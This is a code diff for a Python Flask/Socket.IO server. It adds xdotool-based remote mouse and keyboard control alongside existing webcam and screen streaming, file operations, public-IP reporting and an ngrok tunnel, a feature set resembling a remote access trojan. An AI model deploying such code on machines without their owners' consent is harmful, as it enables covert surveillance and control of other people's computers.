@@ -119,6 +119,40 @@ def webcam_stream():
         except:
             break
 
+# ===== REMOTE CONTROL (mouse + keyboard) =====
+def get_screen_size():
+    try:
+        r = subprocess.run(["xdotool", "getdisplaygeometry"], capture_output=True, text=True, timeout=5)
+        w, h = r.stdout.strip().split()
+        return int(w), int(h)
+    except:
+        return 1920, 1080
+
+def remote_mousemove(x, y):
+    subprocess.run(["xdotool", "mousemove", "--sync", str(x), str(y)], timeout=5)
+
+def remote_click(button):
+    btn_map = {"left": "1", "middle": "2", "right": "3"}
+    b = btn_map.get(button, "1")
+    subprocess.run(["xdotool", "click", b], timeout=5)
+
+def remote_mousedown(button):
+    btn_map = {"left": "1", "middle": "2", "right": "3"}
+    b = btn_map.get(button, "1")
+    subprocess.run(["xdotool", "mousedown", b], timeout=5)
+
+def remote_mouseup(button):
+    btn_map = {"left": "1", "middle": "2", "right": "3"}
+    b = btn_map.get(button, "1")
+    subprocess.run(["xdotool", "mouseup", b], timeout=5)
+
+def remote_key(key):
+    subprocess.run(["xdotool", "key", key], timeout=5)
+
+def remote_type(text):
+    import shlex
+    subprocess.run(["xdotool", "type", "--", text], timeout=5)
+
 # ===== FILE OPS =====
 def safe_path(path):
     global current_dir
@@ -270,12 +304,16 @@ def api_info():
         host = os.popen("hostname").read().strip()
         user = os.getenv("USER", "unknown")
         ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
+        sw, sh = get_screen_size()
         return jsonify({
             "hostname": host,
             "os": f"{uname.sysname} {uname.release}",
             "user": user,
             "cwd": current_dir,
             "ip": ip,
+            "screen": f"{sw}x{sh}",
+            "screen_w": sw,
+            "screen_h": sh,
             "uptime": os.popen("uptime -p").read().strip() if os.path.exists("/proc/uptime") else "N/A"
         })
     except Exception as e:
@@ -304,6 +342,31 @@ def handle_start_screen():
 @socketio.on("start:webcam")
 def handle_start_webcam():
     threading.Thread(target=webcam_stream, daemon=True).start()
+
+# ===== REMOTE CONTROL SOCKETS =====
+@socketio.on("remote:mousemove")
+def handle_remote_mousemove(data):
+    threading.Thread(target=remote_mousemove, args=(data["x"], data["y"]), daemon=True).start()
+
+@socketio.on("remote:click")
+def handle_remote_click(data):
+    remote_click(data.get("button", "left"))
+
+@socketio.on("remote:mousedown")
+def handle_remote_mousedown(data):
+    remote_mousedown(data.get("button", "left"))
+
+@socketio.on("remote:mouseup")
+def handle_remote_mouseup(data):
+    remote_mouseup(data.get("button", "left"))
+
+@socketio.on("remote:key")
+def handle_remote_key(data):
+    remote_key(data["key"])
+
+@socketio.on("remote:type")
+def handle_remote_type(data):
+    remote_type(data["text"])
 
 # ===== NGROK =====
 def start_ngrok():
